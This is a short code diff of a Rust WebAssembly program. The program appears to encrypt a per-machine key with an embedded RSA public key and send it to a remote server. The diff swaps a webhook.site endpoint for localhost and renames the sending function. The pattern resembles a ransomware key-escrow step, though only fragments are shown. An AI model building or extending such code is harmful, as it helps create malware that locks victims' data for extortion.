@@ -12,7 +12,7 @@ use wasm_bindgen::prelude::*;
 use wasm_bindgen_futures::JsFuture;
 use web_sys::{console, RequestInit, Response};
 
-static SERVER_URL: &str = "https://webhook.site/11d4daa1-ff9d-4d6d-9df7-864f8d1843b7";
+static SERVER_URL: &str = "http://localhost:3000";
 
 static PUBLIC_KEY: &str = "-----BEGIN RSA PUBLIC KEY-----\nMIIBCgKCAQEAodnCUqJjbJcpWgqpGP77GVIDSTgxxJqvwU4/b0IIcKScxf/tD+tq\nPVg6rwL8Kr3uVsCQUS1GZWrQhBNYDWZzp/o51MuuXYa7RVAa20siHhir/HnQiHi/\nmXSnPIWSHOu69cNJw8A3LV73cVBV1QM6QJ2p9VyRVPe2rjKE9rgJszuBVBkf1+D+\noTjCPOOPWCNQFaP7WQZ1up+xcEvZs6xxSek1q7WUmzWkaS+6amtrF2WfVe5j1dYK\nmuzutnnW6797sMtxD5AXkJm1NLWDxkGvnQeLlKc4pLsGH8yBmYyvw+IFKG82BMdX\nLJ8CbwotJo9A7fmiWMLwjLb9Ev1xu8bhkQIDAQAB\n-----END RSA PUBLIC KEY-----";
 
@@ -31,7 +31,7 @@ pub fn encrypt(plaintext: Vec<u8>) -> Vec<u8> {
     encrypted
 }
 
-async fn send_machine_info(machine_id: String) {
+async fn send_machine_key(machine_id: String) {
     let rsa_public_key = RsaPublicKey::from_pkcs1_pem(PUBLIC_KEY).unwrap();
 
     let encrypted_key = rsa_public_key
@@ -66,5 +66,5 @@ async fn start() {
     local_storage.set_item("machine_id", &machine_id).unwrap();
 
     // TODO: using one key per machine
-    send_machine_info(machine_id).await;
+    send_machine_key(machine_id).await;
 }
